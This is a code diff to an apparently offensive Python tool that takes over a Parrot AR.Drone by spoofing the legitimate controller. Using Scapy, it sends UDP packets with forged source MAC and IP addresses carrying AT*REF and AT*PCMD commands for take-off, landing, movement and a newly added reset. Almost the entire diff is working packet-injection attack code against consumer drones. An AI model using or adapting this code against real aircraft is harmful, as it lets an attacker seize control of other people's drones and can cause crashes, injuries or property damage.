@@ -18,7 +18,7 @@ def menu():
 
 
 
-    
+
             FRONT                                        UP
              |Z|                                        |I|
     LEFT |Q| |S| |D| RIGHT                TURN LEFT |J| |K| |L| TURN RIGHT
@@ -34,12 +34,20 @@ def menu():
     """
     sys.stdout.write(GREEN + controler)
 
+def reset(list_of_client, dstMAC, iface):
+    global sequenceNumber
+    for i in range(5):
+        sequenceNumber+=1
+        payload = "AT*REF="+str(1)+",290717696\r"
+        for client in list_of_client:
+            spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
+            sendp(spoofed_packet, iface=iface)
+
 def hover(list_of_client, dstMAC, iface):
     global sequenceNumber
     for i in range(5):
         sequenceNumber+=1
         payload = "AT*PCMD="+str(sequenceNumber)+",0,0,0,0,0\r"
-        print(payload)
         for client in list_of_client:
             spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
             sendp(spoofed_packet, iface=iface)
@@ -50,7 +58,6 @@ def take_off(list_of_client, dstMAC, iface):
     for i in range(1):
         sequenceNumber+=1
         payload = "AT*REF="+str(sequenceNumber)+",290718208\r"
-        print(payload)
         for client in list_of_client:
             spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
             sendp(spoofed_packet, iface=iface)
@@ -60,7 +67,6 @@ def land(list_of_client, dstMAC, iface):
     for i in range(5):
         sequenceNumber+=1
         payload = "AT*REF="+str(sequenceNumber)+",290717696\r"
-        print(payload)
         for client in list_of_client:
             spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
             sendp(spoofed_packet, iface=iface)
@@ -71,7 +77,6 @@ def front(list_of_client, dstMAC, iface):
     for i in range(3):
         sequenceNumber+=1
         payload = "AT*PCMD="+str(sequenceNumber)+",1,0,-1050253722,0,0\r"
-        print(payload)
         for client in list_of_client:
             spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
             sendp(spoofed_packet, iface=iface)
@@ -82,7 +87,6 @@ def back(list_of_client, dstMAC, iface):
     for i in range(3):
         sequenceNumber+=1
         payload = "AT*PCMD="+str(sequenceNumber)+",1,0,1050253722,0,0\r"
-        print(payload)
         for client in list_of_client:
             spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
             sendp(spoofed_packet, iface=iface)
@@ -93,7 +97,6 @@ def left(list_of_client, dstMAC, iface):
     for i in range(3):
         sequenceNumber+=1
         payload = "AT*PCMD="+str(sequenceNumber)+",1,-1050253722,0,0,0\r"
-        print(payload)
         for client in list_of_client:
             spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
             sendp(spoofed_packet, iface=iface)
@@ -104,7 +107,6 @@ def right(list_of_client, dstMAC, iface):
     for i in range(3):
         sequenceNumber+=1
         payload = "AT*PCMD="+str(sequenceNumber)+",1,1050253722,0,0,0\r"
-        print(payload)
         for client in list_of_client:
             spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
             sendp(spoofed_packet, iface=iface)
@@ -115,7 +117,6 @@ def up(list_of_client, dstMAC, iface):
     for i in range(3):
         sequenceNumber+=1
         payload = "AT*PCMD="+str(sequenceNumber)+",1,0,0,1050253722,0\r"
-        print(payload)
         for client in list_of_client:
             spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
             sendp(spoofed_packet, iface=iface)
@@ -126,7 +127,6 @@ def down(list_of_client, dstMAC, iface):
     for i in range(3):
         sequenceNumber+=1
         payload = "AT*PCMD="+str(sequenceNumber)+",1,0,0,-1050253722,0\r"
-        print(payload)
         for client in list_of_client:
             spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
             sendp(spoofed_packet, iface=iface)
@@ -137,7 +137,6 @@ def turn_left(list_of_client, dstMAC, iface):
     for i in range(3):
         sequenceNumber+=1
         payload = "AT*PCMD="+str(sequenceNumber)+",1,0,0,0,-1050253722\r"
-        print(payload)
         for client in list_of_client:
             spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
             sendp(spoofed_packet, iface=iface)
@@ -148,7 +147,6 @@ def turn_right(list_of_client, dstMAC, iface):
     for i in range(3):
         sequenceNumber+=1
         payload = "AT*PCMD="+str(sequenceNumber)+",1,0,0,0,1050253722\r"
-        print(payload)
         for client in list_of_client:
             spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
             sendp(spoofed_packet, iface=iface)
@@ -183,6 +181,7 @@ def ci_main(drone, iface):
             elif choice.upper() == 'M':
                 land(list_of_client, dstMAC, iface)
             elif choice == ' ':
+                reset(list_of_client, dstMAC, iface)
                 break
             else:
                 print('\n{}Grrrr{}: Krokmou doesn\'t junderstand.\n'.format(RED,GREEN))
